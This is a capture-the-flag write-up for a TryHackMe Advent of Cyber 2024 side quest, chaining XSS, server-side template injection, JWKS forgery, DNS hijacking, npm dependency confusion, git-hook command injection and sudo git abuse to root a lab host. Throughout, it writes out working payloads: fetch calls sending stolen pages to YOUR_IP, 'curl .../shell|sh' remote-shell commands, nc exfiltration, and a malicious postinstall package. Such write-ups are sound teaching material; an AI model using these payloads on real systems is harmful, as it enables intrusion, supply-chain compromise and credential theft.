---
title: AOC2024 Side Quest 5 writeup
draft: false
tags:
  - rce
  - os-command-injection
  - ssti
  - dependecy-confusion
  - dns
---
## Summary

In this challenge we start by performing a XSS attack that allows us to discover and exploit a template injection vulnerability. We get access to a container where we find internal repositories.
This allows us to exploit a dependency confusion attack by changing the registry pointed by an internal node application, thus accessing a second container. There we find access to a git repo with an hook vulnerable to OS command injection. We finally use the sudo privileges of the git user on the host to get root.

A special thanks to all my team mates (aquinas, 0xb0b, shadow_absorber, Jayy, Scrubz).
The key to unlock the challenge can be found by analyzing the binary from Day19 with ghidra. See 0xb0b writeup (https://0xb0b.gitbook.io/writeups/tryhackme/2024/advent-of-cyber-24-side-quest/t5-an-avalanche-of-web-apps) for a detailed description about how to extract the keycard.

## Recon

An nmap scan reveals these open ports:

```
Nmap scan report for 10.10.138.100
Host is up (0.033s latency).
Not shown: 65530 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
53/tcp    open  domain
80/tcp    open  http
3000/tcp  open  ppp
```

Web servers on port 80 and 3000 both redirect to `thehub.bestfestivalcompany.thm`

```bash
curl -i 10.10.138.100:80
HTTP/1.1 302 Found
Date: Thu, 26 Dec 2024 09:21:13 GMT
Server: Apache/2.4.58 (Ubuntu)
Location: http://thehub.bestfestivalcompany.thm


curl -i 10.10.138.100:3000
HTTP/1.1 302 Found
X-Powered-By: Express
Location: http://thehub.bestfestivalcompany.thm
```

Since we have a DNS server available we perform a zone transfer and learn about new subdomains:

```
dig @10.10.138.100 bestfestivalcompany.thm axfr

thehub-int.bestfestivalcompany.thm.   600 IN A  172.16.1.3
thehub.bestfestivalcompany.thm.       600 IN A  172.16.1.3
npm-registry.bestfestivalcompany.thm. 600 IN A  172.16.1.2
thehub-uat.bestfestivalcompany.thm.   600 IN A  172.16.1.3
adm-int.bestfestivalcompany.thm.      600 IN A  172.16.1.2
```

We can set in our /etc/hosts these names , and playing around we find that the following domains are all accessible from the outside:

- thehub.bestfestivalcompany.thm 
- thehub-uat.bestfestivalcompany.thm
- npm-registry.bestfestivalcompany.thm

Npm registry is powered by verdaccio but useless at this point. **thehub-uat** presents us a contact form that looks promising from a XSS perspective

![[Screenshot 2024-12-26 alle 10.30.24.png]]

Another interesting domain is **thehub-int** where we have a login page

![[Screenshot 2024-12-26 alle 10.40.06.png]]

Furthermore, gobuster reveals a couple of interesting endpoints in thehub-int:

```bash
gobuster dir -u http://thehub-int.bestfestivalcompany.thm/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt 


/dashboard            (Status: 302) [Size: 23] [--> /]
/wiki                 (Status: 302) [Size: 23] [--> /]
```
## XSS on thehub-uat to exploit thehub-int


We first use a simple `<img>` tag payload in the contact form to confirm the XSS possibility:


![[Screenshot 2024-12-26 alle 10.33.08.png]]

After a minute or so we get an hit:

```
┌──(kali㉿kali)-[~/thm/aoc2024/sq5]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.138.100 - - [26/Dec/2024 11:32:32] code 404, message File not found
10.10.138.100 - - [26/Dec/2024 11:32:32] "GET /x HTTP/1.1" 404 -
```


The plan now is trying to explore thehub-int. So we first setup a XSS payload to point to a self-hosted `script.js` by sending this message:

```html
<script src="//YOUR_IP:8000/script.js"></script>
```

In `script.js` we can use this payload (using thehub-int.bestfestivalcompany.thm we get an empty reply, not sure why):

```javascript
fetch("/", {method:'GET',mode:'no-cors',credentials:'same-origin'})
  .then(response => response.text())
  .then(text => {
fetch('http://YOUR_IP:8000/?y=' + btoa(text), {mode:'no-cors'});
});
```

With this payload we start getting hits the show an admin page  with a couple of links:

```html
  <h1>Dashboard</h1>
  </header>
    <div class="dashboard-view">
        <div class="contact-responses">
            <a href="/contact-responses" class="inside btn-enlarge">
               ...
                <p class="" >View Contact Us Responses</p>
            </a>
        </div>
        <div class="wiki ">
            <a href="/wiki" class="inside btn-enlarge">
            ...
```

This suggests that we are actually targeting an admin user logged into thehub-int (it has access to `/wiki`, which we know from the previous gobuster). So let's try to have a look at this endpoint:

```javascript
fetch("/wiki", {method:'GET',mode:'no-cors',credentials:'same-origin'})
  .then(response => response.text())
  .then(text => {
fetch('http://YOUR_IP:8000/?y=' + btoa(text), {mode:'no-cors'});
});
```


We become aware of the `/wiki/new` endpoint

```html
 <div class="wrapper" style="justify-content: flex-start; margin-top: 30px; height: 100%;">
    <a class="btn-enlarge" href="/wiki/new">Create New WIKI</a>
```

that we can visit to learn about this form:

```html
   <form action="/wiki" method="POST">
      <label>Title</label>
      <input type="text" name="title" required>
      <label>Content (Markdown)</label>
      <textarea name="markdownContent" required></textarea>
      <button type="submit">Create</button>
    </form>
```


We are now ready to try posting to `/wiki` and see what happens.  Our first idea was trying to see if there is some kind of template injection:

```javascript
const formData = new URLSearchParams({
  title: "My New Wiki",
  markdownContent: `PAYLOAD GOES HERE`
});

fetch('/wiki', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
  },
  body: formData.toString(),
})
  .then(response => response.text())
  .then(text => {
fetch('http://YOUR_IP:8000/?y=' + btoa(text), {mode:'no-cors'});
});

```

In response to this POST to the wiki endpoint we find a way to inspect the effects of our payloads by visiting the created wikis:

```html
<li>
<a class="btn-enlarge" href="/wiki/1">My New Wiki</a>
</li>
```

After **a lot of struggling** we found this payload that finally gives us RCE:

```javascript
const formData = new URLSearchParams({
  title: "My New Wiki",
  markdownContent: `{{ ''.constructor.constructor('require("child_process").exec("curl YOUR_IP:8000/shell|sh")')() }}`
});

fetch('/wiki', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
  },
  body: formData.toString(),
})
  .then(response => response.text())
  .then(text => {
fetch('http://YOUR_IP:8000/?y=' + btoa(text), {mode:'no-cors'});
});
```

In hindsight, if we inspected the external npm-registry we would have found a markdown package, authored by McSkidy that would have shortened the search for a valid ssti payload.
## Inside the first container

We find ourselves inside the first container:

```
6175ac98a7ec:/app/bfc_thehubint# pwd
/app/bfc_thehubint

6175ac98a7ec:/app/bfc_thehubint# ls
index.js           node_modules       package-lock.json  package.json       public             views

6175ac98a7ec:/app/bfc_thehubint# ifconfig
eth0      Link encap:Ethernet  HWaddr 02:42:AC:10:01:03  
          inet addr:172.16.1.3  Bcast:172.16.1.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:12850 errors:0 dropped:0 overruns:0 frame:0
          TX packets:12067 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:2550195 (2.4 MiB)  TX bytes:4757769 (4.5 MiB)

```

Here we spent a lot of time looking at the surrounding environment, searching for open ports and doing recon on a second visibile container (we are inside 172.16.1.3 and we know that 172.16.1.2 exists from our initial DNS recon, and indeed we have ports 3000 and 5000 open on 172.16.1.2). Everything reveals useless until we decided to look around in the filesystem where we find a .git directory: `/app/bfc_thehubuat/assets/.git/`

Since we don't have git installed inside the container, we exfiltrated  all of the assets directory 

```bash
cd /app/bfc_thehubuat/
tar cvfz assets.tar.gz assets/
cat assets.tar.gz | nc YOUR_IP 9001
# we are listening on our machine with nc -lvp 9001 > assets.tar.gz
```

A `git log -p` reveals a private ssh key deleted from an older commit

```
commit 0b8f682a01ca115073d8f25c20c24d25e6f28c13
Author: bfc_admin <bfc_admin@bestfestivalcompany.thm>
Date:   Tue Dec 17 00:58:22 2024 +0800

    Fixed issues on the backup directory

diff --git a/assets/backups/backup.key b/assets/backups/backup.key
deleted file mode 100644
index b75271c..0000000
--- a/assets/backups/backup.key
+++ /dev/null
@@ -1,49 +0,0 @@
------BEGIN OPENSSH PRIVATE KEY-----
-b3BlbnNzaC1rZXktdjEAAAAA...
```

From `.git/config` we also notice that the repository is probably accessible from the external host ip address:
```
[remote "origin"]
        url = git@10.10.208.125:bfcthehubuat
        fetch = +refs/heads/*:refs/remotes/origin/*

``` 

Accessing the host with this key reveals a gitolite installation and a bunch of repositories where we have read ("R") permissions:

```
ssh -i git-key git@10.10.138.100
The authenticity of host '10.10.138.100 (10.10.138.100)' can't be established.
ED25519 key fingerprint is SHA256://qu3xDsL32Bp5WN2AE681gqLa8lMnbnkt1U7w8vcpM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.138.100' (ED25519) to the list of known hosts.
PTY allocation request failed on channel 0
hello backup, this is git@tryhackme-2404 running gitolite3 3.6.12-1 (Debian) on git 2.43.0

 R      admdev
 R      admint
 R      bfcthehubint
 R      bfcthehubuat
 R      underconstruction
Connection to 10.10.138.100 closed.
```

We clone those repos and start looking around

## admint source code analysis 

The interesting repo is `admint` where we discover these endpoints:
```javascript
// Modify resolv.conf
app.post('/modify-resolv', ensureJWKSLoaded, authenticateToken, async (req, res) => {

// Restart service
app.post('/restart-service', ensureJWKSLoaded, authenticateToken, async (req, res) => {

// Reinstall Node.js modules
app.post('/reinstall-node-modules', ensureJWKSLoaded, authenticateToken, async (req, res) => {
```


Those endpoints trigger some actions on the referred services, connecting to them using a root ssh key as shown by this snippet of code:

```javascript
const sshConfig = {

host: '', // Supplied by the user in API requests
port: 22,
username: 'root',
privateKey: fs.readFileSync('./root.key'),
readyTimeout: 5000,
strictVendor: false,
tryKeyboard: true,
};
```

The endpoints need a JWT authentication, but luckily for us it is done with public key infrastructure and the admin app grabs the the JWKS from  a place that is actually under our control

```javascript
async function fetchJWKS() {
try {
console.log('Fetching JWKS...');
const response = await axios.get('http://thehub-uat.bestfestivalcompany.thm:3000/jwks.json');
const fetchedJWKS = response.data;
```

We can modify the `jwks.json` file since it is hosted inside the container where we have a shell as root!

Furthermore, all of the node applications  point to the internal registry (which is on container 172.16.1.2) according to .npmrc files:

```
registry=http://npm-registry.bestfestivalcompany.thm:4873/
```

So putting  all the pieces together  the plan could be:

- put **our own JWKS** file inside `thehub-uat` so that we can authenticate to the internal service with our crafted JWTs
- invoke the endpoint to change the `resolv.conf `of container 172.16.1.2,  and point it to **our own DNS server**
- perform a supply chain attack by **pointing the registry to ourselves**,  by altering resolving the  `npm-registry` A record with our own IP


So let's first identify the `admint` application: it should be on 172.16.1.2:3000 according to our previous recon from within the container and in fact this is promising:

```bash
curl 172.16.1.2:3000/modify-resolv -X POST
{"error":"Unauthorized"}
```

We used the JWT Editor Burp extension (also available for the community edition) to generate this header

```bash
export TOKEN="eyJraWQiOiJjNmE0NzBmYi1lODFlLTQ3ZTQtOTU1OS1mMTViZjc4ZDIzOTkiLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwidXNlcm5hbWUiOiJtY3NraWR5LWFkbSJ9.O3UYCJvJ0T-uKItEcx80yMTgudvuqhLzGzvlQ9EAtSWQKyLJg5stykV0DZef5uI1lPN0fR2XQ-De4P803tBck3Z-BnWpM_EgNte_L223y-R1I6KhsmNCwq6jBNuQjIbv8_0k5Gq76JnhnOFupf7wquYaZantzplc69LRV7gLB_qSeqcxiZp-E5XvgYY5wB_HBrw9s54e30YfKU3Egl3oWmZch-NI-R7o6z_l7ZuTXIVgs-QQ9OXq2r0idNjdms12kAhpadEmRqifKTxMKWQk3JmbLOdDLE91fW8mxhGRqaFUbFRJM6_qfKLf991iC4k7TXVCycprX_d5Q-0pyK6KSg"

curl 172.16.1.2:3000/modify-resolv -X POST -H "Authorization: Bearer ${TOKEN}" ; echo
{"error":"Missing host or nameserver value."}

```

that can be used with the corresponding `jwks.json`

```json
{"keys": [
{
    "p": "w6senT4JUApbn5jx3FTpKHNI4eRCclqKxU_7GybCdvpMHximRbvkTtjxCK3t8wm0KdOk4kDAmL_Mo1GgV9aGM-TvBOfku3SuvHNSOev0JrEF_ZChxg_zuubQMnPBnqGUWm8Yw_w2Th4GIR7k_wR4DphjbXBT8QxJ_jK5SIW0iek",
    "kty": "RSA",
    "q": "tWb9O6Jz5jm4rIvXb7EQrauzDnRTjmJkBpHkSdscO90ecaqB02Z0meEsKMEkhscXKE-uDerAWeyJQzHI0_d8af4jC0vxNywoskCQuV0xjgwA9qBvv6oTqDu7YxXDV7qUf0_SzmK0g81NpBa46PD6pTtd1MTbwH0SQtx-UuVOVM0",
    "d": "DWwrDTSZ3eVC9EsUcaAhoIgpd03FQH1lv32hNINZf6VETJpCYUfkn0WTTNnhxreKtKfCnIcNT5j_D3t4lSnxa5nh7Mkf4zivfoNvhlA5M3mjtsLWBQq4-C7WbgVYjEIPKJJFibOI81Xdh94VzNYz7aOkcoLhmlrW4kbhAOo_A5zdnQpw0Yep5yE1sD7Pfvtf3NzauZadR8tlZtIo3AZpClTsg1rTxKO9oBO9EBObcHG0I1jFUfD_P9yCgIwD3UxqSxc6PW2ETkQMPp6PV68unZW5_8T6KXHkA7xwPzb2d7DFmypBXfjcmVDzBI-FS-GSuXv_34ZH6bje3C9bst7RcQ",
    "e": "AQAB",
    "kid": "c6a470fb-e81e-47e4-9559-f15bf78d2399",
    "qi": "AemXxZy2YVgbHxifH_5o4YZYAXS7e7PIUFO_m1SWHUQhZr9dJk_wWfqBOBGyxMjuu-A14U2ajQ81LTa0giEPIE9NGoRViWxuNa2rsxIjpwyDqalSzsWdlgA9CmV8W3MMworjK3IVsgAmzCQqOLXkZkwruPtSCeuD-KkDMHTVEX4",
    "dp": "GM975EhXefS2RXhpQpzpq51ionIFEub0LazElF7HzbpTKKZBfxoiCvVrKsSTJXwXgi45_A5l3XiEhDj3cevbvHzM6fxVfod_GJou1PVcUgOkVNCgErM3Hn3h7GPNK0Ylv4nSxBcY87LO6Cg4tTVl28Pq55eUrT33q-nWoKGDkPE",
    "dq": "UZtqcuiLcVgoT1995N5oXWjv3aHRcS2sSBRb-inbUscQChyl2R-vdwaIojD5qLRqI5Vs_Q_NxuaVfago68rbqqdMxqk8dBCmokJPmURmpbuat1jHzRbLTxTIITRKM-5ZHckgUf6vrNewhRA_0XOPnsPNW4nQPpFFpNSi89H64kU",
    "n": "iqa0YRFfoQ_UzsEao6RgI-ck9YnrEaORZXmfXiN30aDknghkXzyfL-IVXMBp5v7yocgV9kMYavCNZ8f_N_djgTFErq0_08y0K52MOdoC2kldH6LnZtyX6eFmLjEMT5gyTSqX_zx9mqIzhBw7RVdomcvpaQYeHE2aPgIcCO1qf3ddRBBsJyQd3bdS67Dvc8hxHVarThanPP2IND_buWRmkdoBc2DgHlAK9ODQqtZVvq7RJDAVI5Z2Tx4XTHR3K7vylOnjXB2Ei4K9B1J_AdRu50mOBonnT04zH6iI1Ujoqtn_pugK3WITt4pBlqPFb3so9xxIQt8C5vvNDkHzwNDjlQ"
}
]}
```


Now we need to identify the correct parameters (by looking at source code or studying the responses), and they turn out to be the following:

```bash
curl http://172.16.1.2:3000/modify-resolv -X POST \
-H "Authorization: Bearer ${TOKEN}" \
-H 'Content-Type: application/json' \
--data '{"host":"172.16.1.2","nameserver":"YOUR_IP"}'

{"message":"resolv.conf updated successfully","output":""}
```

```bash
curl http://172.16.1.2:3000/reinstall-node-modules -X POST \
-H "Authorization: Bearer ${TOKEN}" \
-H 'Content-Type: application/json' \
--data '{"host":"172.16.1.2","service":"admdev"}'

{"message":"Node modules reinstalled successfully for service admdev","output":"added 68 packages in 14s\n\n14 packages are looking for funding\n  run `npm fund` for details"}
```

We now "just" need to setup a local DNS server and a local verdaccio server. We will target the `express` npm package version `4.21.2` since from the available verdaccio installation we know that is the version in use.

The local dns server can be dnsmasq with this configuration in `dnsmasq.conf` (we launch it as `dnsmasq -d -C ./dnsmasq.conf` in order to also have a real time debug log)

```
auth-ttl=60
auth-zone=bestfestivalcompany.thm
auth-server=bestfestivalcompany.thm
# Disable any DHCP functionality (DNS only)
no-dhcp-interface=

host-record=thehub-uat.bestfestivalcompany.thm,172.16.1.3
host-record=npm-registry.bestfestivalcompany.thm,YOUR_IP # our ip
# Enable logging for debugging purposes
log-queries
```

To install verdaccio on our kali vm we run this command as root:

```bash
npm install -g verdaccio

verdaccio
(node:61015) Warning: Verdaccio doesn't need superuser privileges. don't run it under root
(Use `node --trace-warnings ...` to show where the warning was created)
(node:61015) Warning: Verdaccio doesn't need superuser privileges. don't run it under root
info --- config file  - /root/.config/verdaccio/config.yaml
info --- the "crypt" algorithm is deprecated consider switch to "bcrypt" in the configuration file. Read the documentation for additional details
info --- using htpasswd file: /root/.config/verdaccio/htpasswd
info --- plugin successfully loaded: verdaccio-htpasswd
info --- plugin successfully loaded: verdaccio-audit
warn --- http address - http://localhost:4873/ - verdaccio/6.0.5

```

We need to make some adjustments to config.yaml since we need to listen on all ip addresses and we don't have to forward queries to the real upstream  npm registry:

```yaml
# listen on all ip addresses
listen:
  - 0.0.0.0:4873

# disable auth and proxying
packages:
  '@*/*':
    # scoped packages
    access: $all
    publish: $all
    unpublish: $all
    # proxy: npmjs # disable proxing to npmjs registry
    
  '**':
    access: $all
    publish: $all
    unpublish: $all
    # proxy: npmjs # disable proxing to npmjs registry
```

Depending on npm **client** versions you may need to register an account (if your npm client refuses to even run without some form of authentication):

```
npm adduser --registry http://localhost:4873 --auth-type legacy # needed only for certain versions of npm client
```

We are now ready to setup our fake express package to be published with `npm publish --registry http://localhost:4873`, so we first create an express directory on our machine with an empty `index.js` and  `postinstall.js` and` package.json` as indicated below:

```javascript title="postinstall.js"
const { exec } = require("child_process");

exec("curl http://YOUR_IP:8000/shell|sh", (err) => {
  if (err) {
    console.error(`Error: ${err.message}`);
  }
});
```


```javascript title="package.json"
{
  "name": "express",
  "version": "4.21.2",
  "description": "A harmless-looking package",
  "main": "index.js",
  "scripts": {
    "postinstall": "node postinstall.js"
  }
}
```

Please note that we are targeting the `express` package because we know that the admdev app (which run on 172.16.1.2:5000) uses it, and version 4.21.2 can be derived from the real `npm-registry` site.
When we finally instruct the app to reload node packages  we obtain a shell in the second container where we find the root key used to ssh into the various containers.

```
d73596d5136c:/app/admint# cat root.key
-----BEGIN OPENSSH PRIVATE KEY-----
b3Bl.....
-----END OPENSSH PRIVATE KEY-----
```


## Accessing the host and privesc to root

Accessing again the external gitolite service with this new key, we find new repos:

```
ssh -i key2 git@10.10.138.100
PTY allocation request failed on channel 0
hello developer, this is git@tryhackme-2404 running gitolite3 3.6.12-1 (Debian) on git 2.43.0

 R W    admdev
 R      admint
 R      bfcthehubint
 R      bfcthehubuat
 R      gitolite-admin
 R      hooks_wip
 R      underconstruction
Connection to 10.10.138.100 closed.

```

`hooks_wip` reveals a post-receive shell hook that suggests we can achieve command execution via commit messages (because `commit_message` flows unsanitized inside a "bash -c" with double quotes)
```bash title="post-receive"
#!/bin/bash

LOGFILE="/home/git/gitolite-commit-messages.log"

while read oldrev newrev refname; do
    if [ "$newrev" != "0000000000000000000000000000000000000000" ]; then
        # Get the commit message
        commit_message=$(git --git-dir="$PWD" log -1 --format=%s "$newrev")
        bash -c "echo $(date) - Ref: $refname - Commit: $commit_message >> $LOGFILE"
    else
        # Log branch deletion
        bash -c "echo $(date) - Ref: $refname - Branch deleted >> $LOGFILE"
    fi
done
```


In fact it's enough to publish a new commit  to the admdev repo (were now we have write permission) with a commit message like the following to gain shell as user git on  the host:

```bash
$(curl http://YOUR_IP:8000/shell|sh)
```

By pushing this commit we are now user git on the host

```bash
git@tryhackme-2404:~/repositories/admdev.git$ id
uid=115(git) gid=122(git) groups=122(git)
```

We can launch the following command using sudo:

```bash
git@tryhackme-2404:~/repositories/admdev.git$ sudo -l
Matching Defaults entries for git on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User git may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/git --no-pager diff *
```

The following will show us user root ssh key

```bash
sudo /usr/bin/git --no-pager diff /dev/null /root/.ssh/id_ecdsa
```

A probably  unintended way to get root is launching this from inside a git repository

```
sudo /usr/bin/git --no-pager diff --help
```

This will actually bring up a pager, from which we can escape using the usual `!sh` trick.
